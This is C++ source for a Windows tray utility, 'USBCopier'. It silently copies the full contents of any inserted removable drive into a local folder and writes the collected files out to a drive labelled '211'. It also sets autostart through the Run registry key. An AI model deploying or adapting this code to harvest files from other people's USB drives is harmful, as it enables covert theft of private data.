#include <windows.h>
#include <string>
#include <vector>
#include <dbt.h>
#include <shlwapi.h>
#include <fstream>
#include <thread>
#include <mutex>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <locale>
#include <codecvt>
#include "resource.h"
#pragma comment(lib, "shlwapi.lib")
using namespace std;

// 自定义消息处理常量
const int WM_USER_SHELLICON = WM_USER + 1;
const int ID_TRAY_EXIT = 1001; // 菜单命令ID
const int IDM_TOGGLE = 1002; // 定义一个唯一的整数值

// 全局变量
NOTIFYICONDATA nid;
HINSTANCE hInst;
mutex logMutex;
HMENU hMenu = nullptr;

// 获取当前时间的字符串
wstring GetFormattedCurrentTime()
{
    auto now = chrono::system_clock::now();
    auto in_time_t = chrono::system_clock::to_time_t(now);
    struct tm timeinfo;
    localtime_s(&timeinfo, &in_time_t);
    wstringstream ss;
    ss << put_time(&timeinfo, L"%Y-%m-%d %X");
    return ss.str();
}

// 转换编码
string WStringToUTF8(const wstring& wstr)
{
    wstring_convert<codecvt_utf8<wchar_t>> conv;
    return conv.to_bytes(wstr);
}

// 记录日志
void LogMessage(const wstring& message)
{
    wstring logPath = L"D:\\save\\log.txt";
    ofstream logFile(logPath, ios::app);
    if (logFile.is_open()) {
        logFile << WStringToUTF8(GetFormattedCurrentTime() + L" - " + message);
        logFile.close();
    }
}

//自启动
//获取当前可执行文件路径
wstring GetExePath()
{
    wchar_t path[MAX_PATH];//路径
    GetModuleFileNameW(nullptr, path, MAX_PATH);//获取路径
    return path;//返回路径
}

// 设置注册表自启动
void SetAutoStart() {
    HKEY hKey = nullptr;
    wstring path = GetExePath(); // 获取当前可执行文件路径
    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    RegSetValueExW(hKey, L"USBCopier", 0, REG_SZ, (BYTE*)path.c_str(), (path.size() + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
}

bool GetAutoStart() {
    HKEY hKey = nullptr;
    DWORD pathSize = 0;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExW(hKey, L"USBCopier", 0, nullptr, nullptr, &pathSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
        RegCloseKey(hKey);
    }
    return false;
}

// 取消注册表自启动
void CancelAutoStart()
{
    HKEY hKey = nullptr;
    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    RegDeleteValueW(hKey, L"USBCopier");
    RegCloseKey(hKey);
}

// 递归拷贝目录
bool CopyDirectory(const wstring& src, const wstring& dst)
{
    WIN32_FIND_DATAW findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    wstring path = src + L"\\*.*";

    hFind = FindFirstFileW(path.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return false;
    do {
        if (wcscmp(findData.cFileName, L".") == 0 ||
            wcscmp(findData.cFileName, L"..") == 0)
            continue;
        wstring srcPath = src + L"\\" + findData.cFileName;
        wstring dstPath = dst + L"\\" + findData.cFileName;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!CreateDirectoryW(dstPath.c_str(), nullptr) &&
                GetLastError() != ERROR_ALREADY_EXISTS) {
                continue;
            }
            wstring output = L"Copy Directory: '" + srcPath + L"' to '" + dstPath + L"'\n";
            OutputDebugStringW(output.c_str());
            LogMessage((L"Copy Directory: '" + srcPath + L"' to '" + dstPath + L"'\n").c_str());
            CopyDirectory(srcPath, dstPath);
        }
        else {
            if (!PathFileExistsW(dstPath.c_str())) {
                if (CopyFileW(srcPath.c_str(), dstPath.c_str(), FALSE)) {
                    wstring output = L"Copy File: '" + srcPath + L"' to '" + dstPath + L"'\n";
                    OutputDebugStringW(output.c_str());
                    LogMessage(output);
                }
            }
        }
    } while (FindNextFileW(hFind, &findData) != 0);
    FindClose(hFind);
    return true;
}

// 监控U盘插入
void CheckUSB()
{
    wchar_t drives[256];
    GetLogicalDriveStringsW(256, drives);
    wchar_t* drive = drives;
    while (*drive) {
        UINT type = GetDriveTypeW(drive);

        if (type == DRIVE_REMOVABLE) {
            wstring root = drive;
            wchar_t volumeNameBuffer[MAX_PATH];
            GetVolumeInformationW(root.c_str(), volumeNameBuffer, MAX_PATH, NULL, NULL, NULL, NULL, 0);
            wstring volumeName = volumeNameBuffer;

            // 检查卷标
            if (volumeName == L"211") {
                wstring output = L"***Target USB Drive Found: " + volumeName + L" (" + root.substr(0, 2) + L")\n";
                OutputDebugStringW(output.c_str());
                LogMessage(output);

                wstring target = root.substr(0, 2);// Target
                if (!PathFileExistsW(target.c_str())) {
                    CreateDirectoryW(target.c_str(), nullptr);
                }
                thread copyThread(CopyDirectory, L"D:\\save", target);
                copyThread.detach();
            }
            else {
                wstring output = L"USB Drive Found: " + volumeName + L" (" + root.substr(0, 2) + L")\n";
                OutputDebugStringW(output.c_str());
                LogMessage(output);

                root = root.substr(0, 2);
                wstring target = L"D:\\save\\" + volumeName;// Target
                if (!PathFileExistsW(target.c_str())) {
                    CreateDirectoryW(target.c_str(), nullptr);
                }
                thread copyThread(CopyDirectory, root, target);
                copyThread.detach();
            }
        }
        drive += wcslen(drive) + 1;
    }
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message) {
    case WM_DEVICECHANGE:
        if (wParam == DBT_DEVICEARRIVAL) {
            wstring output = L"Message: DBT_DEVICEARRIVAL\n";
            OutputDebugStringW(output.c_str());
            LogMessage(output);
            CheckUSB();
        }
        break;
    case WM_USER_SHELLICON:
        if (lParam == WM_RBUTTONDOWN) {
            POINT pt;
            GetCursorPos(&pt);
            SetForegroundWindow(hWnd);
            if (GetAutoStart() == true) {
                CheckMenuItem(hMenu, IDM_TOGGLE, MF_BYCOMMAND | MF_CHECKED);
            }
            else {
                CheckMenuItem(hMenu, IDM_TOGGLE, MF_BYCOMMAND | MF_UNCHECKED);
            }

            TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hWnd, NULL);
        }
        break;
    case WM_COMMAND:
        if (LOWORD(wParam) == ID_TRAY_EXIT) {
            DestroyWindow(hWnd);
        }
        if (LOWORD(wParam) == IDM_TOGGLE) {
            UINT state = GetMenuState(hMenu, IDM_TOGGLE, MF_BYCOMMAND);
            if (state & MF_CHECKED) {
				MessageBoxW(hWnd, L"USBCopier no longer starts with Windows.", L"USBCopier", MB_OK);
                CancelAutoStart();
                CheckMenuItem(hMenu, IDM_TOGGLE, MF_BYCOMMAND | MF_UNCHECKED);
            }
            else {
                MessageBoxW(hWnd, L"USBCopier now starts with Windows.", L"USBCopier", MB_OK);
				SetAutoStart();
                CheckMenuItem(hMenu, IDM_TOGGLE, MF_BYCOMMAND | MF_CHECKED);
            }
        }
        break;
    case WM_DESTROY:
        Shell_NotifyIcon(NIM_DELETE, &nid);
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

void InitWindow()
{
    WNDCLASSEXW window;
    window.cbSize = sizeof(WNDCLASSEX);
    window.style = CS_HREDRAW | CS_VREDRAW;
    window.lpfnWndProc = WndProc;
    window.cbClsExtra = 0;
    window.cbWndExtra = 0;
    window.hInstance = hInst;
    window.hIcon = LoadIcon(hInst, MAKEINTRESOURCE(APPICON));
    window.hCursor = LoadCursor(nullptr, IDC_ARROW);
    window.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    window.lpszMenuName = nullptr;
    window.lpszClassName = L"USBCopier";
    window.hIconSm = LoadIcon(hInst, MAKEINTRESOURCE(APPICON));
    RegisterClassEx(&window);

    HWND hWnd = CreateWindowEx(0, L"USBCopier", L"", 0, 0, 0, 0, 0, nullptr, nullptr, hInst, nullptr);
    ShowWindow(hWnd, SW_HIDE);

    nid.cbSize = sizeof(NOTIFYICONDATA);
    nid.hWnd = hWnd;
    nid.uID = 1;
    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    nid.uCallbackMessage = WM_USER_SHELLICON;
    nid.hIcon = LoadIcon(hInst, MAKEINTRESOURCE(APPICON));
    lstrcpyW(nid.szTip, L"USBCopier");
    Shell_NotifyIcon(NIM_ADD, &nid);

    hMenu = CreatePopupMenu();
    AppendMenu(hMenu, MF_STRING, IDM_TOGGLE, TEXT("随 Windows 启动"));
    AppendMenu(hMenu, MF_STRING, ID_TRAY_EXIT, L"退出 USBCopier");
}


// 入口
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    hInst = hInstance;
    InitWindow();
    LogMessage(L"#USBCopier Started#\n   - This program is developed by Kazea. Thank you for using it.\n   - In accordance with the principles of free software, you are free to use, modify, and distribute this program under the CC BY 4.0 license.\n   *\n");
    CheckUSB();
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int)msg.wParam;
}
